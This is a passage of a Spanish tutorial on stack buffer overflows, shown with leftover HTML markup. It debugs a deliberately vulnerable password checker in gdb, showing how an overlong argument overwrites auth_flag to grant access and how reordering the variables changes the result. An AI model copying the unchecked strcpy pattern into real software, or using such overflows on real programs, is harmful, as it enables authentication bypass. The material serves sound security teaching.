-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-
      Acceso concedido.
-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;hkr-&amp;gt; ./auth_overflow.binary AAAAAAAAAAAAAAAAAAAAAAAAAAAAA

-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-
      Acceso concedido.
-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;¿Qué ha pasado?, vamos a echar un vistazo con gdb:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;gdb -q auth_overflow.c.binary
Using host libthread_db library &lt;span class=&#34;s2&#34;&gt;&amp;quot;/lib/tls/i686/cmov/libthread_db.so.1&amp;quot;&lt;/span&gt;.
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; b 9
Breakpoint &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; at 0x8048421: file auth_overflow.c, line 9.
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; b 16
Breakpoint &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; at 0x804846f: file auth_overflow.c, line 16.
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Starting program: /home/hkr/booksrc/auth_overflow.c.binary
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, check_authentication &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0xbffff9f4 &lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &amp;lt;repeats&amp;gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
    at auth_overflow.c:9
&lt;span class=&#34;m&#34;&gt;9&lt;/span&gt;               strcpy&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;password_buffer, password&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/s password_buffer
0xbffff7d0:      &lt;span class=&#34;s2&#34;&gt;&amp;quot;)����o��b���)205�04b�o������b&amp;quot;&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/x &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;auth&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;_flag
0xbffff7ec:     0x00000000
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; print 0xbffff7ec - 0xbffff7d0
&lt;span class=&#34;nv&#34;&gt;$1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 28
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/16xw password_buffer
0xbffff7d0:     0xb7f9f729      0xb7fd6ff4      0xbffff808      0x08048529
0xbffff7e0:     0xb7fd6ff4      0xbffff8a0      0xbffff808      0x00000000
0xbffff7f0:     0xb7ff47b0      0x08048510      0xbffff808      0x080484bb
0xbffff800:     0xbffff9f4      0x08048510      0xbffff868      0xb7eafebc
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Abrimos el programa con el depurador y ponemos puntos de ruptura en las líneas 9 y 16. Después lo ejecutamos pasándole como argumento una cadena con Aes. Al llegar al primer punto de ruptura examinamos la variable &lt;em&gt;password_buffer&lt;/em&gt;, que hasta ahora solo contiene basura. Examinamos la variable &lt;em&gt;auth_flag&lt;/em&gt; y vemos que contiene un cero. Luego restamos las direcciones de ambas variables, averiguando así la distancia entre ellas, en este caso &lt;em&gt;auth_flag&lt;/em&gt; está 28 bytes despues de &lt;em&gt;password_buffer&lt;/em&gt;. Veamos qué podemos hacer con esto:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; c
Continuing.

Breakpoint 2, check_authentication &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0xbffff9f4 &lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &amp;lt;repeats&amp;gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
    at auth_overflow.c:16
&lt;span class=&#34;m&#34;&gt;16&lt;/span&gt;              &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; auth_flag&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/s password_buffer
0xbffff7d0:      &lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &amp;lt;repeats&amp;gt;
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/x &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;auth&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;_flag
0xbffff7ec:     0x41414141
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/16xw password_buffer
0xbffff7d0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff7e0:     0x41414141      0x41414141      0x41414141      &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0x41414141&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
0xbffff7f0:     0x41414141      0x08048500      0xbffff808      0x080484bb
0xbffff800:     0xbffff9f4      0x08048510      0xbffff868      0xb7eafebc
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/4cb &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;auth&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;_flag
0xbffff7ec:     &lt;span class=&#34;m&#34;&gt;65&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;65&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;65&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;65&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/dw &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;auth&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;_flag
0xbffff7ec:     1094795585
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;En el siguiente punto de rutpura, volvemos a examinar las variables y se puede apreciar que la variable &lt;em&gt;password_buffer&lt;/em&gt; se ha desbordado, ya que tenía capacidad para 16 caracteres, y hemos intentado guardar 36. Si vemos el contenido de &lt;em&gt;auth_flag&lt;/em&gt; ya no tiene un cero, si no 0x41414141, lo cual corresponde a cuatro Aes (41 en hexadecimal es el código ASCII de la A). Se puede apreciar claramente cómo se ha desbordado el array en la instrucción &lt;em&gt;x/16xw password_buffer&lt;/em&gt;, el valor encerrado entre paréntesis es el de la variable &lt;em&gt;auth_flag&lt;/em&gt;, el cual se ha sobrescrito. Por último vemos que el valor en decimal de 0x41414141 es 1094795585.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; c
Continuing.

-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-
      Acceso concedido.
-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-

Program exited with code 034.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Continuamos con la ejecución y nos da acceso a pesar de que no hemos introducido la contraseña correcta. Esto se debe a que hemos sobrescrito la variable &lt;em&gt;auth_flag&lt;/em&gt; y, por lo tanto, la función &lt;em&gt;check_authentication&lt;/em&gt; devolverá el valor &lt;em&gt;0x41414141, 1094795585&lt;/em&gt; en decimal.&lt;/p&gt;

&lt;p&gt;Sin embargo, esto ha funcionado ha consecuencia de la colocación de las variables en memoria. ¿Qué pasaría si &lt;em&gt;auth_flag&lt;/em&gt; y &lt;em&gt;password_buffer&lt;/em&gt; estuvieran declaradas al revés?:&lt;/p&gt;

&lt;h1 id=&#34;auth-overflow2-c&#34;&gt;&lt;code&gt;auth_overflow2.c&lt;/code&gt;&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;

&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;check_authentication&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
   &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;password_buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
        &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;auth_flag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

   &lt;span class=&#34;n&#34;&gt;strcpy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password_buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;

  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strcmp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password_buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;quot;brillig&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
       &lt;span class=&#34;n&#34;&gt;auth_flag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strcmp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password_buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;quot;outgrabe&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;auth_flag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;auth_flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[])&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
     &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;Usage: %s n&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
       &lt;span class=&#34;n&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
 &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;check_authentication&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
       &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;n-=-=-=-=-=-=-=-=-=-=-=-=-=-n&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;      Acceso concedido.n&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
       &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;-=-=-=-=-=-=-=-=-=-=-=-=-=-n&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
   &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;nAcceso denegado.n&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
   &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Al estar declaradas en este orden, no podemos modificar la variable &lt;em&gt;auth_flag&lt;/em&gt; desbordando el buffer:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;gdb -q auth_overflow2.c.binary
Using host libthread_db library &lt;span class=&#34;s2&#34;&gt;&amp;quot;/lib/tls/i686/cmov/libthread_db.so.1&amp;quot;&lt;/span&gt;.
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; b 9
Breakpoint &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; at 0x8048421: file auth_overflow2.c, line 9.
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; b 16
Breakpoint &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; at 0x804846f: file auth_overflow2.c, line 16.
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Starting program: /home/hkr/booksrc/auth_overflow2.c.binary
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, check_authentication &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0xbffff9f8 &lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &amp;lt;repeats&amp;gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
    at auth_overflow2.c:9
&lt;span class=&#34;m&#34;&gt;9&lt;/span&gt;               strcpy&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;password_buffer, password&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/s password_buffer
0xbffff7e0:
&lt;span class=&#34;s2&#34;&gt;&amp;quot;�o������b����o���G���20205�04bb����204�04b�����20205�04bh��������02&amp;quot;&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/x &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;auth&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;_flag
0xbffff7dc:     0x00000000
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/16xw &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;auth&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;_flag
0xbffff7dc:     0x00000000      0xb7fd6ff4      0xbffff8a0      0xbffff808
0xbffff7ec:     0xb7fd6ff4      0xb7ff47b0      0x08048510      0xbffff808
0xbffff7fc:     0x080484bb      0xbffff9f8      0x08048510      0xbffff868
0xbffff80c:     0xb7eafebc      0x00000002      0xbffff894      0xbffff8a0
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; c
Continuing.

Breakpoint 2, check_authentication &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0xbffff9f8 &lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &amp;lt;repeats&amp;gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
    at auth_overflow2.c:16
&lt;span class=&#34;m&#34;&gt;16&lt;/span&gt;              &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; auth_flag&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/s password_buffer
0xbffff7e0:      &lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &amp;lt;repeats&amp;gt;
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/x &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;auth&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;_flag
0xbffff7dc:     0x00000000
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/16xw &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;auth&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;_flag
0xbffff7dc:     &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0x00000000&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;    0x41414141      0x41414141      0x41414141
0xbffff7ec:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff7fc:     0x08004141      0xbffff9f8      0x08048510      0xbffff868
0xbffff80c:     0xb7eafebc      0x00000002      0xbffff894      0xbffff8a0
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Seguimos pasos similares a los de antes, con la diferencia de que ahora &lt;em&gt;auth_flag&lt;/em&gt; está situada en memoria antes que &lt;em&gt;password_buffer&lt;/em&gt;, como podemos comprobar en la salida de &lt;em&gt;x/16xw &amp;auth;_flag&lt;/em&gt;.&lt;/p&gt;

